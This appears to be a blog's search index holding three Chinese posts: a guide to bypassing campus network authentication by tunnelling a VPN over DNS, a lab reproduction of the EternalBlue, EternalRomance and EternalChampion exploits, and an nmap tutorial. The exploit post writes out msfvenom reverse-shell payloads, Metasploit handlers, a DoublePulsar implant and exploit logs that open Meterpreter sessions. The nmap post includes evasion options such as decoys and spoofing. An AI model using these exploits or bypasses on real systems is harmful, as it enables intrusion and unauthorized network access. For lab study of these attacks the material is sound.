<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[绕过校园网认证，实现校园防断网]]></title>
    <url>%2Fposts%2F390158a6.html</url>
    <content type="text"><![CDATA[我的学校晚上十一点后就断网了，对于我这没有办理手机无限流量套餐的，看着可怜少之又少的流量套餐，断网后，就是一件悲催的事情，不能追剧，不能看动漫，不能刷漫画,很是无奈。最近，听说有位学弟实现了校园防断网，立马请教，学弟发了几片文章让我参考去实现，搞了一两天，感觉我真的手挺拙的，只能时不时地麻烦学弟,折腾了好几种防断网的方式，最后感觉搭建SoftEther实现防断网的方式比较稳。 实现原理校园网的web认证，我们电脑连接这个wifi或者插上网线实现认证之前，电脑就已经被分配到了一个ip地址，当我们想要上网的时候，网关会修改我们的http数据包，让我们重定向到一个提示要打开网络认证或直接到网络认证的页面。如果没有认证成功，无法得知网关的arp信息，也就无法发送跨网段的tcp连接和http请求，当然无法上网。但是，开启web认证交换机设备默认是放行DHCP和DNS报文,也是就udp53和udp67。当然，这就是我们实现防断网要利用的重点。如果没有对udp53和udp67发送的任何数据包进行拦截，我们可以利用udp53和udp67发送任何形式的数据包，实现不用锐捷认证，就可以上网。这里有篇web认证的详细说明http://www.ruijie.com.cn/fw/wt/36502 环境检测电脑先连上wifi或者插上网线，不要认证。打开cmd命令行，输入nslookup wwww.baidu.com 在没有认证校园网的情况下，可以查到ip地址，可以判定没有过滤dns报文接下来，我们看一下没有放行udp53的所有数据包先到该githb上下载一下测试工具 https://github.com/BennyThink/UDP53-Filter-Typelinux用户 运行 python UDP53.pywindow下的用户运行dist下的UDP53.exe出现 Congratulations, you may wanna try OpenVPN! 就知道dup53的任何数据包都被放行了。现在我们可以继续下一步了。 准备准备一台vps不建议买国内的云服务器来搭建，因为很多都是限制宽带的，搭建起来网速会很卡。国外的vps比较好用的就vultr和搬瓦工的，vultr的性价比较高，个人建议买vultr的vps。vutlr的官网：https://www.vultr.com/softether的客户端和服务端相关软件可以在下面的链接下载，不过要翻墙。http://www.softether-download.com/cn.aspx?product=softether 不能翻墙的，这里提供一个百度云盘地址下载链接：https://pan.baidu.com/s/1OgpdL9Wg3naGNTUeQpDoAQ 密码：ylgn softether 服务端的搭建vps的系统环境我选择linux系统ubuntu。 32位：wget http://cfya.cfyqy.com/vpn_tool/softether-vpnserver-v4.27-9668-beta-2018.05.29-linux-x86-32bit.tar.gz 64位：wget http://cfya.cfyqy.com/vpn_tool/softether-vpnserver-v4.27-9668-beta-2018.05.29-linux-x64-64bit.tar.gz 根据自己的系统选择相应的位数 tar -zxvf 解压该压缩包 进入解压的vpnserver中cd vpnservermake 然后输入3个连续的1继续输入 开启服务./vpnserver start 然后进行简单的配置输入./vpncmd 依次1，回车，回车接下来输入ServerPasswordSet 输入管理服务器的密码，两次确定之后，按 ctrl+C 退出管理。设置开机自启动。终端里依次输入：vi /etc/rc.local 在 exit 0 之前写入(start之前目录， 根据自己安装的位置填写)/root/vpnserver/vpnserver start 保存后退出 softether 服务端的管理管理服务端在本地windows上安装softether 服务端的管理软件运行该软件后，新设置一个连接，填写相应的配置，填写vps的ip地址和之前设置的softetherr的服务端的密码成功的连上vps的softether的服务端，开始相应的配置。 新建hub默认已经建立了一个hub,可以使用默认的hub,我这里新建hub再建一个hub,随意的填写名字 和密码 新建用户点击test,再点击管理用户，在新建的hub中新建一个用户，填写用户名(随意），密码自己设，连接的验证方式有挺多种的，这里就选择密码验证。 启动SecureNAT配置 SecureNAT。在虚拟NAT和DHCP服务器中启动secureNAT,查看一下secureNAT的相应配置，保持默认就行，不要修改。 勾选VPN over ICMP/DNS的配置然后到加密与网络中，点击VPN over ICMP/DNS，勾上那两个功能，校园防断网的实现就靠这个了。在这里防断网的功能就已经实现了接下来客户端的四种连接方式的没有必要一一尝试，只要懂得用softether client连接服务端，就可以实现防断网了。 客户端的连接客户端的连接，在服务端中我么就可以看到有三种连接方式：L2TP加密的连接、openVPN软件连接、VPN Azure连接。当然还有一种连接方式，直接用softether客户端连接。当然个人实践中能实现防断网的只有softether客户端的连接方式。其他的客户端连接方式就当做vpn用吧 softether client要想实现校园无认证上网，用这种连接方式比较稳。当然该客户端只有电脑版的，没有手机的客户端，有点遗憾。不过你也可以电脑开热点给手机用，虽然麻烦点。下载 softether client新建一个vpn连接，如下图填写相应的配置然后就可以直接连接了。 L2TP加密协议连接首先softether 服务端要开启IPsec/L2TP中相应的选项，如下图这种连接方式实现不了防断网，纯属连接一个vpn翻翻墙就ok啦。 手机端的连接手机现在都默认有一个vpn的连接功能，填写相应的配置就可以实现vpn连接。打开手机的设置，找到vpn添加一个新的连接，填写下图相应的配置，选择L2TP类型，输入服务端上的vps地址、IPsec预共享密钥、test的hub的账户 window系统的连接找到Win+R调出运行菜单，输入services.msc，回车，弹出服务控制台。找到Routing and remote access服务，双击打开编辑，设置该服务为自动运行，并启动它到电脑的任务栏最右下方，找到vpn添加新的vpn根据下图进行相应的配置然后在高级选择中打开，更改适配器选项，找到相应的适配器。右击属性，安全，允许使用这些协议，勾选相应的选项。然后就能在wifi中找到vpn的连接，就可以连接成功啦 VPN Azure连接softether 服务端,VPN Azure默认是禁用的， 先开启。仔细看一下，发现VPN Azure真是骚，不用公网ip,只需要用VPN Azure云服务的主机名，就可以实现连接。 pc端的连接。找wifi中找到网络和internet设置，找到共享中心，建立新的连接或网络。 选择连接到工作区选择否使用我的网络连接输入VPN Azure云服务的主机名。在WiFi出找到该连接，进行连接 openVPN连接openVPN这种连接方式不太建议，个人体验，感觉很差，经常连接不上去，网速又慢。softether服务端的配置监听的udp端口要选择53端口。看了网上的教程都说 这样可以实现防断网，不过我个人是没有成功过。然后生成样本配置文件。 确定。 pc端或手机端的配置将生成的样本配置文件中的 文件名为iznbnu828xckp1z_openvpn_remote_access_l3.ovpn复制到openvpn的安装目录的’config’中运行该软件，输入hub中用户名和密码开始连接这一次又连接失败，当那个黄色的是绿色的时候，才是连接成功。 pc端防断网测试现在我插上网线，没有用锐捷客户端认证，现在处于没有网络的状态。可以softether客户端的连接，连接上了，仔细看右下方多了一个网络3的连接，说明我们已经连接上softether 服务端vpn了。现在，没有认证客户端，可以看到vpn适配器在发送数据包，所以说可以上网 。我们游览YouTube，真的可以观看。 网速测试vultr 日本节点的vps 阿里云服务器： 在这里我们可以看到连接到vultr的vps网速比连接到阿里云的网速快得超多的，所以，个人还是建议搭建在国外的vps,不但能防断网，还是翻墙。 参考文章：https://www.bennythink.com/softether-vpnserver.htmlhttps://www.bennythink.com/udp53.html]]></content>
      <categories>
        <category>essay</category>
      </categories>
      <tags>
        <tag>essay</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[永恒之蓝、永恒浪漫、永恒冠军复现]]></title>
    <url>%2Fposts%2Fcaffa366.html</url>
    <content type="text"><![CDATA[自从Shadow Brokers（影子经纪人）泄露NSA(美国安全局) 的大量黑客工具，很多人就开始研究该黑客工具利用利用方式。其中比较出名的利用方式就是WannaCry（又叫Wanna Decryptor），一种“蠕虫式”的勒索病毒软件就是利用了其中的永恒之蓝进行传播的。一直听着别人的利用方式，今天就去学习复现一下。 Eternalblue（永恒之蓝）测试环境 攻击机(window2003) 安装FuzzBunch等 ip 192.168.1.234 靶机(xp) 被攻击 ip 192.168.1.238 另一台攻击机(kail) 监听端口，靶机返回shell到此攻击机 ip 192.168.1.230 window2003相关环境的安装Python2.6：https://www.python.org/download/releases/2.6/（记得加到环境变量里）PyWin32 v2.12（根据自己的攻击机系统选择合适的版本） ：https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/还有FuzzBunch https://github.com/misterch0c/shadowbroker在fb.py中的72行记得注释掉要不会出错。 FuzzBunch.xml中修改下图方框中的路径为你的攻击机上的安装目录相应文件的路径 尝试攻击 运行fb.py 设置目标地址为靶机(xp)地址，回调地址为本机地址 运行 use Eternalbule 当是否提示进行变量设置，选择yes。 攻击的系统（可以看到该模块可以攻击系统对象），此此测试环境是xp，所以就选择0 。传输方式选择1 ‘FB’.最后询问是否使用管道，就默认。 成功后显示 失败了可以 execute 多次尝试一下。失败了没关系，下面能成功就行。 生成dll 在kail中 因为是此环境中靶机xp是32位，所以就使用一下命令生成，然后复制到攻击机（window2003）中 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.234 LPORT=5555 -f dll &gt;reverse.dll 如果是靶机是64位，就 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.234 LPORT=5555 -f dll &gt;reverse.dll payload（载荷）中bind：攻击者连接目标机器的模式，通常比较适合内网渗透，有时会被防火墙拦下reverse：目标机连接攻击者的模式，基本上不会被防火墙阻拦。附上两条bind#32位msfvenom -p windows/meterpreter/bind_tcp RHOST=192.168.1.234 LPORT=5555 -f dll &gt;bind32.dll#64位msfvenom -p windows/x64/meterpreter/bind_tcp RHOST=192.168.1.234 LPORT=5555 -f dll &gt;bind64.dll``` ## kail监听```bashmsf &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lhost 192.168.1.230lhost =&gt; 192.168.1.230msf exploit(multi/handler) &gt; set lport 5555lport =&gt; 5555msf exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.1.230:5555 使用DoublePulsaruse DoublePulsar Architecture 选择 x32，Function 选 RunDLL，然后输入 DLL 路径成功的话攻击机（window2003） 攻击机（kail） Eternalromance（永恒浪漫）测试环境 攻击机(window2003) 安装shadowbroker等 ip 192.168.1.234 靶机(window2003) 被攻击 ip 192.168.1.135 另一台攻击机(kail) 监听端口，靶机返回shell到此攻击机 ip 192.168.1.230 Smbtouch判断可用漏洞use Smbtouch execute 显示可用的漏洞模块 Doublepulsar生成可用shellcodeuse Doublepulsar 一路回车知道，注意选择 *0) OutputInstall ，此项功能可生成shellcode文件名为shellcode.bin（可命名为任意文件） 在这里可以看到永恒浪漫可以攻击的系统对象，可以攻击的window系统还是挺多的。 一路回车，生成shellcode.bin EternalRomance植入Doublepulsar后门use EternalRomance 一路默认，Pipe[] 和Share[] 为可选项，直接回车跳过，Credentials选Anonymous输入先前生成的文件地址一路默认，执行成功已经成功的植入Doublepulsar后门了，可以利用Doublepulsar 生成dll msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.234 LPORT=5555 -f dll &gt;reverse.dll 将生成的reverse.dll复制到攻击机(window2003)中 kail监听msf &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lhost 192.168.1.230lhost =&gt; 192.168.1.230msf exploit(multi/handler) &gt; set lport 5555lport =&gt; 5555msf exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.1.230:5555 Doublepulsar注入use Doublepulsar 一路默认，注意在Function处选择 2)RunDLL，输入dll文件的位置 然后回车到结束即可成功利用 Eternalchampion（永恒冠军）测试环境 攻击机(window2003) 安装FuzzBunch等 ip 192.168.1.234 靶机(window2008 r2) 被攻击 ip 192.168.1.187 另一台攻击机(kail) 监听端口，靶机返回shell到此攻击机 ip 192.168.1.230 工具：winhex 运行 FuzzBunchtargetIP写靶机 IP 192.168.1.187，CallBack写本机ip 192.168.1.234，不使用 Redirection smbtouch 探测先用smbtouch 探测一下可以利用的模块use smbtouchexecute 显示漏洞利用从图中看出可以使用永恒的冠军 Doublepulsar 生成 shellcodeuse Doublepulsar 这次的测试环境的靶机是64位的，所以系统选择x64一路回车直到 出现 0)OutputInstall的选项，选择0输入文件保存地址，这里我写 c:\shellcode64.bin一直回车 ，最后生成shellcode.bin 将 shellcode 转换成 HEX因为 EternalChampion 需要的是ShellcodeBuffer而不是ShellcodeFile，所以这里要利用winhex将 Doublepulsar 生成的 shellcode 转换成十六进制,后面要用到。 EternalChampion 进行攻击use EternalChampion 一直默认回车，直到shellcodeBuffer[]: 将刚才的shellcode64.dll的十六进制的值，粘贴到这里，要一两分钟才能粘贴完，静静等待。在下图我们可以看到永恒的冠军针对的系统还挺多的。然后又是一路回车，到Mode :: Delivery mechanism 选择 FB接下来，还是回车回车回车。复现失败运行execute多次，还是失败，不知道怎么回事，每次到 这里都没有成功过。不管了，看下面能否成功。 生成dll将生成的dll复制到window2003中 kail监听msf &gt; use exploit/multi/handlermsf exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf exploit(multi/handler) &gt; set lhost 192.168.1.230lhost =&gt; 192.168.1.230msf exploit(multi/handler) &gt; set lport 6666lport =&gt; 6666msf exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.1.230:6666 使用 Doublepulsar 注入 dlluse DoublePulsar 然后到function 选择2)Run DLL，输入 dll 文件路然后运行，回车默认，这里还是失败了。试了很多的机子都没有成功。无奈！ msf的利用模块测试环境 攻击机(kail) ip 192.168.1.234 靶机(window2008 R2) ip 192.168.1.238 ms17_010_eternalbluemsf &gt; search ms17_010Matching Modules================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/admin/smb/ms17_010_command 2017-03-14 normal MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution auxiliary/scanner/smb/smb_ms17_010 normal MS17-010 SMB RCE Detection exploit/windows/smb/ms17_010_eternalblue 2017-03-14 average MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption exploit/windows/smb/ms17_010_psexec 2017-03-14 normal MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Executionmsf exploit(windows/smb/ms17_010_psexec) &gt; use exploit/windows/smb/ms17_010_eternalblue msf exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 192.168.1.187rhost =&gt; 192.168.1.187msf exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 192.168.1.230lhost =&gt; 192.168.1.230msf exploit(windows/smb/ms17_010_eternalblue) &gt; set lport 8888lport =&gt; 8888msf exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(windows/smb/ms17_010_eternalblue) &gt; exploit[*] Started reverse TCP handler on 192.168.1.230:8888 [*] 192.168.1.187:445 - Connecting to target for exploitation.[+] 192.168.1.187:445 - Connection established for exploitation.[+] 192.168.1.187:445 - Target OS selected valid for OS indicated by SMB reply[*] 192.168.1.187:445 - CORE raw buffer dump (51 bytes)[*] 192.168.1.187:445 - 0x00000000 57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32 Windows Server 2[*] 192.168.1.187:445 - 0x00000010 30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20 008 R2 Standard [*] 192.168.1.187:445 - 0x00000020 37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63 7601 Service Pac[*] 192.168.1.187:445 - 0x00000030 6b 20 31 k 1 [+] 192.168.1.187:445 - Target arch selected valid for arch indicated by DCE/RPC reply[*] 192.168.1.187:445 - Trying exploit with 12 Groom Allocations.[*] 192.168.1.187:445 - Sending all but last fragment of exploit packet[*] 192.168.1.187:445 - Starting non-paged pool grooming[+] 192.168.1.187:445 - Sending SMBv2 buffers[+] 192.168.1.187:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.[*] 192.168.1.187:445 - Sending final SMBv2 buffers.[*] 192.168.1.187:445 - Sending last fragment of exploit packet![*] 192.168.1.187:445 - Receiving response from exploit packet[+] 192.168.1.187:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)![*] 192.168.1.187:445 - Sending egg to corrupted connection.[*] 192.168.1.187:445 - Triggering free of corrupted buffer.[*] Sending stage (206403 bytes) to 192.168.1.187[*] Meterpreter session 3 opened (192.168.1.230:8888 -&gt; 192.168.1.187:54937) at 2018-06-01 20:11:08 -0400[+] 192.168.1.187:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 192.168.1.187:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 192.168.1.187:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=meterpreter &gt; ifconfigInterface 1============Name : Software Loopback Interface 1Hardware MAC : 00:00:00:00:00:00MTU : 4294967295IPv4 Address : 127.0.0.1IPv4 Netmask : 255.0.0.0IPv6 Address : ::1IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffffInterface 11============Name : Intel(R) PRO/1000 MT Network ConnectionHardware MAC : 00:0c:29:3c:07:87MTU : 1500IPv4 Address : 192.168.1.187IPv4 Netmask : 255.255.255.0IPv6 Address : 2001:250:6801:5501:64c3:4455:dfcc:57d1IPv6 Netmask : ffff:ffff:ffff:ffff::IPv6 Address : 2001:250:6801:5501:ba70:f4ff:0:beaIPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffffIPv6 Address : fe80::64c3:4455:dfcc:57d1IPv6 Netmask : ffff:ffff:ffff:ffff:: ms17_010_psexecmsf &gt; use exploit/windows/smb/ms17_010_psexecmsf exploit(windows/smb/ms17_010_psexec) &gt; set rhost 192.168.1.187rhost =&gt; 192.168.1.187msf exploit(windows/smb/ms17_010_psexec) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(windows/smb/ms17_010_psexec) &gt; set lhost 192.168.1.230lhost =&gt; 192.168.1.230msf exploit(windows/smb/ms17_010_psexec) &gt; set lport 7777lport =&gt; 7777msf exploit(windows/smb/ms17_010_psexec) &gt; exploit[*] Started reverse TCP handler on 192.168.1.230:7777 [*] 192.168.1.187:445 - Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1[*] 192.168.1.187:445 - Built a write-what-where primitive...[+] 192.168.1.187:445 - Overwrite complete... SYSTEM session obtained![*] 192.168.1.187:445 - Selecting PowerShell target[*] 192.168.1.187:445 - Executing the payload...[+] 192.168.1.187:445 - Service start timed out, OK if running a command or non-service executable...[*] Sending stage (206403 bytes) to 192.168.1.187[*] Meterpreter session 2 opened (192.168.1.230:7777 -&gt; 192.168.1.187:54873) at 2018-06-01 20:04:07 -0400meterpreter &gt; ifconfigInterface 1============Name : Software Loopback Interface 1Hardware MAC : 00:00:00:00:00:00MTU : 4294967295IPv4 Address : 127.0.0.1IPv4 Netmask : 255.0.0.0IPv6 Address : ::1IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffffInterface 11============Name : Intel(R) PRO/1000 MT Network ConnectionHardware MAC : 00:0c:29:3c:07:87MTU : 1500IPv4 Address : 192.168.1.187IPv4 Netmask : 255.255.255.0IPv6 Address : 2001:250:6801:5501:64c3:4455:dfcc:57d1IPv6 Netmask : ffff:ffff:ffff:ffff::IPv6 Address : 2001:250:6801:5501:ba70:f4ff:0:beaIPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffffIPv6 Address : fe80::64c3:4455:dfcc:57d1IPv6 Netmask : ffff:ffff:ffff:ffff:: 本文章主要是操作步骤的，没有太多思路的分析，如果想仔细了解，可以看看以下的参考文章 参考文章永恒之蓝的参考文章:http://www.freebuf.com/articles/system/133853.htmlhttps://www.bennythink.com/shadowbroker.html永恒的浪漫的参考文章http://www.freebuf.com/articles/system/132879.html永恒的冠军的参考文章https://www.bennythink.com/eternalchampion.htmlms17_010_psexec的简介https://github.com/rapid7/metasploit-framework/pull/9473]]></content>
      <categories>
        <category>knowledge</category>
        <category>vulnerability</category>
      </categories>
      <tags>
        <tag>knowledge</tag>
        <tag>vulnerability</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[namp工具的细究]]></title>
    <url>%2Fposts%2F9cda70be.html</url>
    <content type="text"><![CDATA[nmap主机端口开发探测神器，一直在使用它来主机发现和端口开放探测，不知道其原理，这次就来仔细地了解一下它的真面目。 主机发现基于arp协议arp协议位于TCP/IP的协议族的网络层，主要解决逻辑地址和物理地址的转换关系。当目标主机与我们处于同一网段时，使用arp协议扫描速度快，结果也精准。nmap -PR 192.168.1.0/24 扫描结果Nmap scan report for RP-LINK.lan (192.168.1.1)Host is up (0.0024s latency).Not shown: 997 closed portsPORT STATE SERVICE22/tcp open ssh53/tcp open domain80/tcp open httpMAC Address: 78:A3:51:11:9A:BA (Shenzhen Zhibotong Electronics)Nmap scan report for LAPTOP-1I94N8QB.lan (192.168.1.128)Host is up (0.0095s latency).Not shown: 995 filtered portsPORT STATE SERVICE135/tcp open msrpc139/tcp open netbios-ssn445/tcp open microsoft-ds3389/tcp open ms-wbt-server5357/tcp open wsdapiMAC Address: 98:E7:F4:57:26:48 (Hewlett Packard)Nmap scan report for 192.168.1.189Host is up (0.0069s latency).All 1000 scanned ports on 192.168.1.189 are closedMAC Address: 78:36:CC:51:05:C9 (Unknown)Nmap scan report for 192.168.1.211Host is up (0.0052s latency).All 1000 scanned ports on 192.168.1.211 are closedMAC Address: EC:D0:9F:FD:1E:BD (Xiaomi Communications)Nmap scan report for DESKTOP-HTFCR1N.lan (192.168.1.234)Host is up (0.017s latency).Not shown: 993 filtered portsPORT STATE SERVICE135/tcp open msrpc139/tcp open netbios-ssn443/tcp open https445/tcp open microsoft-ds902/tcp open iss-realsecure912/tcp open apex-mesh3389/tcp open ms-wbt-serverMAC Address: A0:D3:7A:6C:61:AA (Intel Corporate)dnet: Failed to open device lo0QUITTING! 基于ICMP协议ICMP协议位于TCP/IP协议族中的网络层，是在IP主机、路由器之间传递控制消息。 ICMP的报文种类 类型的值 ICMP报文的类型 差错报文 3 终点不可到达 4 源抑制 11 超时 12 参数失灵 5 重定向 查询报文 8或0 响应请求或应答 13或14 时间戳请求或应答 17或18 地址掩码请求或应答 10或9 路由器询问或通告 1.ICMP响应请求和应答用来测试发送和接收两端链路及目标主机TCP/IP协议是否正常。-PE 和ping实质上一样nmap -PE 192.168.1.0/24 2.ICMP时间戳请求和应答ICMP时间戳允许系统向另外一个系统查询当前时间。nmap -PP 192.168.1.0/24 3.地址掩码请求和应答。ICMP地址掩码请求用源主机发送，用于无盘系统在引导过程中获取自己的子网掩码。大多数主机在收到请求时都发送一个应答。nmap -PM 192.168.1.0/24 基于TCP/IP协议1.TCP位于传输层的协议,面向连接可口的、基于字节流的传输层控制协议。1）TCP SYN扫描向目标主机发送一个SYN标志的数据包（内容为空，默认端口80）nmap -sn -PS[端口号(默认为80)] 192.168.1.0/24 结果Nmap scan report for RP-LINK.lan (192.168.1.1)Host is up (0.028s latency).MAC Address: 78:A3:51:11:9A:BA (Shenzhen Zhibotong Electronics)Nmap scan report for PLK-AL10-ec350dc5c6e55ec3.lan (192.168.1.105)Host is up (0.071s latency).MAC Address: F8:23:B2:8E:8A:D1 (Huawei Technologies)Nmap scan report for 192.168.1.128Host is up (0.028s latency).MAC Address: 98:E7:F4:57:26:48 (Hewlett Packard)Nmap scan report for 192.168.1.211Host is up (0.079s latency).MAC Address: EC:D0:9F:FD:1E:BD (Xiaomi Communications)Nmap scan report for DESKTOP-B0PU34P.lan (192.168.1.214)Host is up (0.17s latency).MAC Address: 44:6D:57:ED:08:3C (Liteon Technology)Nmap scan report for HUAWEI_MAIMANG_5.lan (192.168.1.241)Host is up (0.10s latency).MAC Address: 00:5A:13:AD:6E:D7 (Huawei Technologies)Nmap scan report for DESKTOP-RG8DNUJ.lan (192.168.1.225)Host is up.Nmap done: 256 IP addresses (7 hosts up) scanned in 39.62 seconds 2）2.TCP ACK向目标主机发送一个TCP/ACK数据包，存活的主机会返回一个RST数据包。nmap -sn -PA 192.168.1.0/24 2.UDP协议udp协议非面向连接的，不可靠的简单的传输层协议。当一个dup端口收到一个udp数据包时，如果是关闭的，就会给源端口发回一个ICMP端口不可达数据包，如果是开放的，就会丢弃这个数据包，不返回任何信息。nmap -PU 192.168.1.0.24 基于SCTP协议6SCTP是传输层上的协议,与TCP完成的任务是相同的。 但存在很大 不同 tcp sctp 单地址连接 多地址连接 基于字节流 基于消息流 只能支持一个流 同时支持多个流 通过三次握手实现连接 通过四次握手实现连接 支持stcp协议的主机并不多，不建议使用nmap -sn -PY 192.168.1.0/24 使用IP协议所有的tcp udp icmp IGMP数据都是以ip数据包格式传输。 数据包中协议域的长度为8位，标识哪个协议想ip发送数据，ICMP为1,IGMP为2，TCP为6，UDP为7。nmap默认使用ICMP(1) IGMP(2) IP-IN-IP(4)nmap -sn -PO 192.168.1.0/24``` ## nmap中dns协议 1.nmap默认只会对活跃的主机进行dns转换，强制所有主机无论是否活跃都做dns转换可用-R```bashnmap -R 45.32.7.5-24 2.ip都转换为域名会耗费大量时间，无须转换用-你nmap -n 45.32.7.5-24 主机发现技术分析–packet-trace可以通过它就可以观察nmap发出的数据包和收到的数据包。nmap -sn -PS 192.168.1.0/24``` 观察结果时，发现nmap没有发送syn数据包。原来nmap的设计思路时: 先 判断目标主机与nmap所在的主机是否在同一网段，如果相同的话，则直接使用ARP扫描模式。 # 端口扫描 ## 端口的分类 公认端口(Well Known Ports) 即一般意义上的常用端口。从0到1024；这些端口通常紧密地绑定在一些特定的系统服务中。 注册端口(Registered Ports)指的是从1025到49151的端口。松散着绑定一些服务。这些端口大部分没有明确定义服务对象，而且程序可以通过自己的需要定义使用哪些端口，很多远程控制软件和木马程序都会使用它们。 动态或私有端口( Dynamic or Private Ports) 49152到65535。正常情况下服务不会被分配到这些端口上，但很多木马喜欢。 ## 端口状态的定义 open:表明该端口有应用程序接收TCP链接或者UDP报文。 closed:端口可访问，可以接受nmap探测报文并做出响应。相比较而言没有应用程序在端口监听。 filtered:设备过滤了数据包，设备可能是路由器、防火墙甚至专门的软件。 unfiltered： 目标端口是可以访问的，但是无法判断open还是closed.（ACK扫描时才会出现） open|filtered:无法确定端口是开放的还是被过滤了，开放的端口不响应就是一个例子。 closed|filtered: 无法确定端口是关闭还是被过滤了。只有在使用idle扫描时才会发生这种情况。 ## 端口扫描方法 ### SYN扫描 nmap默认的扫描方式，扫描极快，一秒钟可以扫描上千个端口，也不会在主机上留下扫描痕迹。 目标主机应答| 端口状态---|---SYN/ACK|openRST|closed没有应答|过滤ICMP无法抵达错误（类型3，代码1，2，3，4，10，13）|filtered ```bashnmap -sS 45.32.8.31``` ### Tcp Connect扫描 跟syn扫描类似，只是完成 了tcp的三次握手。 ```bashnmap -sT 45.32.8.31 udp扫描相当慢nmap -sU 45.32.8.31 目标主机应答 端口状态 UDP应答 open 没有应答 open 或者filtered ICMP端口无法抵达错误（类型3，代码3） closed ICMP无法抵达错误（类型3，代码1，2，9，10，13） filtered TCP FIN扫描向目标端口发送一个FIN数据包，按照RFC793规定，对所有关闭的端口，目标系统应该返回RST标志。nmap -sF 45.32.8.31 NULL 扫描向目标端口发送一个不包含任何标志的数据包。按照RFC793规定，对所有关闭的端口，目标系统应该返回RST标志。nmap -sN 45.32.8.31 Xmas Tree 扫描向目标端口发送一个含有FIN URG PUSH标志的数据包。按照RFC793规定，对所有关闭的端口，目标系统应该返回RST标志。nmap -sX 45.32.8.31``` ### idle扫描 ```bashnmap -Pn -p- -sI 第三方主机 目标主机 扫描指定的端口1.扫描常见的100个端口nmap -F 45.32.8.31 2.指定一个端口nmap -p 80 45.32.8.31 3.使用名字来制定扫描端口。nmap -p smtp,http 45.32.8.31 4.扫描常用端口nmap --top-ports 45.32.8.31``` # 远程操作系统和服务 ```bash-O 对操作系统扫描 -A 操作系统探测和服务发现-sV 服务和版本检测--allports 不为版本探测时排除任何端口 --version-intensity&lt;intensity&gt; -sV 探测报文的轻度值，默认为7 范围0~9 --version-all 尝试每个探测 相当于version-intensity 9--version-trace 跟踪版本扫描活动。 是--packet-trace 所得到的子集 nmap的高级使用1.对nmap发送的探测数据包进行分段。nmap -f 45.32.8.31 2.最大传输单元（MTU）是指一种通信协议的某层桑面所能通过的最大数据包大小（字节为单位），以太网的默认值为1500bytes.这里的mtu的值必须8的倍数nmap -mtu 16 45.32.8.31 3.使用诱饵主机隐蔽扫描作为诱饵主机必须处于工作状态，否则就变成洪水攻击。在进行版本检测或tcp连接扫描时，诱饵扫描无效。nmap -D RND:4 45.32.8.31``` ```bashnmap -D 192.168.1.214 45.32.8.31``` 4.源端口欺骗 网络安全控制中有一种访问控制列表技术，依靠ip地址和端口来对数据包进行限制。可以通过--source-port或-g指定源端口,来突破检测机制。 ```bashnamp -g 53 45.32.8.31 5.发送报文时附加随机数据默认情况下nmap发送的报文中只包含头部，内容部分是空的，因此tcp数据包的大小只有40字节，而ICMP ECHO 请求只有28个字节。这种内容为空的报文很容易被目标网络检测机制所发现。nmap --data-length 20 45.32.8.31``` 6.设置IP time-to-live域```bashnmap -ttl 25 45.32.8.31 7.MAC地址欺骗使用字符串“0” 将简单选择一个完全随机的MAC地址nmap -sn --spoof-mac 0 45.32.8.31 8.扫描结果保存1）文件本件nmap -oN "d:\\test.txt" 45.32.8.31 2）xml文件 nmap -oX &quot;d:\\test.xml&quot; 45.32.8.31 3)grep文件之中nmap -oG "d:\\test.grep" 45.32.8.31 nse脚本 分类 分类 描述 auth 包含的都是负责处理鉴权证书(绕开鉴权)的脚本 broadcast 在局域网内探查更多服务开启状况，如CHCP DNS SQL Sever等服务的脚本 brute 针对常见的应用，如HTTP/FTP等使用暴力破解密码的脚本 default 这是使用-sC和-A参数扫描时默认的脚本，提供基本脚本扫描能力 discovery 对网络进行更多的信息收集，如SMB收集、SNMP查询等 dos 用来发起拒绝服务攻击的脚本 exploit 用来完成对目标系统安全漏洞渗透的脚本 external 针对第三方服务的脚本 fuzzer 